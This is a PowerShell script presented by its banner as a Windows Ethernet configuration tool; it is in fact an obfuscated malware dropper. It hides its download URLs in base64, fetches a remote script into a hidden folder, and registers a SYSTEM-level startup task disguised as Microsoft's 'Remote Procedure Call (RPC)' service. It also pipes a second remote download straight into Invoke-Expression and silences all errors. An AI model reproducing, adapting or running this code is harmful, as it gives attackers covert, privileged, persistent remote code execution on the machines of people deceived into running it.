<#
 __      __.__            .___                    ___________ __  .__                                __    _________                _____.__        
/  \    /  \__| ____    __| _/______  _  ________ \_   _____//  |_|  |__   ___________  ____   _____/  |_  \_   ___ \  ____   _____/ ____\__| ____  
\   \/\/   /  |/    \  / __ |/  _ \ \/ \/ /  ___/  |    __)_\   __\  |  \_/ __ \_  __ \/    \_/ __ \   __\ /    \  \/ /  _ \ /    \   __\|  |/ ___\ 
 \        /|  |   |  \/ /_/ (  <_> )     /\___ \   |        \|  | |   Y  \  ___/|  | \/   |  \  ___/|  |   \     \___(  <_> )   |  \  |  |  / /_/  >
  \__/\  / |__|___|  /\____ |\____/ \/\_//____  > /_______  /|__| |___|  /\___  >__|  |___|  /\___  >__|    \______  /\____/|___|  /__|  |__\___  / 
       \/          \/      \/                 \/          \/           \/     \/           \/     \/               \/            \/        /_____/  
#>
$downloadUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL2RvbGJvZWIuZXhl"
$updaterExeB64 = "dXBkYXRlci5leGU="
$hiddenAttrB64 = "SGlkZGVu"
$silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
$stopActionB64 = "U3RvcA=="
$directoryB64 = "RGlyZWN0b3J5"
$runAsB64 = "UnVuQXM="
$scriptUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL2ludm9rZWNvbW1hbmQ=" # заменить на реал
$trustedNameB64 = "TWljcm9zb2Z0RXRoZXJuZXRVcGRhdGUucHMx"
$trustedFolderB64 = "VXBkYXRlQ2FjaGU="
$programfilesB64 = "QzpcUHJvZ3JhbSBGaWxlcw=="


$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))
$scriptUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($scriptUrlB64))
$trustedName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($trustedNameB64))
$trustedFolder = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($trustedFolderB64))
$programfiles = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($programfilesB64))
$uacStatus = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA -eq 1
$persistFolder = Join-Path $env:ProgramFiles $trustedFolder

function Add-ScheduledTask {
    try {
        $persistFolder = "C:\ProgramData\Java Schedule Updater"
        $persistScriptPath = Join-Path $persistFolder $trustedName
        if (-not (Test-Path -Path $persistFolder)) {
            New-Item -Path $persistFolder -ItemType Directory -Force
        }


        Invoke-WebRequest -Uri $scriptUrl -OutFile $persistScriptPath -UseBasicParsing -ErrorAction Stop      

        Set-ItemProperty -Path $persistScriptPath -Name Attributes -Value "Hidden"

        $action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistScriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName 'Remote Procedure Call (RPC)' -Description 'Microsoft Corporation Remote Procedure Calls needs to be autorunned with Windows to run Ethernet Configuration' -ErrorAction Stop
        iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/TaskSuccesful" | iex
        
    } catch {}
}
Add-ScheduledTask


